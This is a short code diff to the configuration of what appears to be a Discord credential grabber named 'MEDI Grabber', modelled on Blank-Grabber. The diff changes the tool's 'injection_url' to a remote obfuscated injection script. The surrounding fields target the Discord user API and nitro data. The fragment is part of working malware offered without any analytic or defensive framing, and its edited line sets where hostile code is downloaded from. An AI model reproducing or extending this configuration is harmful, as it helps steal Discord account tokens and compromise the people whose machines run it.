@@ -19,7 +19,7 @@ const config = {
   embed_name: 'MEDI Grabber', 
   embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/lol/main/lololololol.js', 
+  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
